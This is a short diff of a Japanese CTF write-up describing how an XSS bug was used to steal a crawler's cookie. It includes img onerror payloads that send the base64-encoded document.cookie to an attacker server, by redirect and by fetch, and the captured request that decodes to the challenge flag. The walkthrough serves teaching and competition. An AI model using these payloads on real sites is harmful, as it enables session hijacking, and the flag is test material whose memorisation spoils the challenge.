@@ -36,10 +36,10 @@ XSSが達成できたので、次に配布されたクローラのソースを�
 ~~~
 ```
 setCookieしているので、document.cookieを取得してリダイレクトすればよい。  
-`<img src="1" onerror="location.href='https://[リクエストが受け取れるサーバ]/?s='+btoa(document.cookie)"`  
+`<img src="1" onerror="location.href='https://[リクエストが受け取れるサーバ]/?s='+btoa(document.cookie)"`で行う。  
 しかし、うまく動作しなかった(ローカルではChrome,Firefoxで動作した)。  
 クローラではよくあることなので、別手法としてfetchすればよい。  
-`<img src="1" onerror="fetch('https://[リクエストが受け取れるサーバ]/?s='+btoa(document.cookie))"`  
+`<img src="1" onerror="fetch('https://[リクエストが受け取れるサーバ]/?s='+btoa(document.cookie))"`で行う。  
 すると`/?s=ZmxhZz1IYXJla2F6ZUNURntjaHIxc3RtNHNfNGx3NHlzX3JlbTFuZHNfbWVfMGZfNG00ZzRtMX0=`のリクエストが飛んでくる。  
 ```bash
 $ echo "ZmxhZz1IYXJla2F6ZUNURntjaHIxc3RtNHNfNGx3NHlzX3JlbTFuZHNfbWVfMGZfNG00ZzRtMX0=" | base64 -d
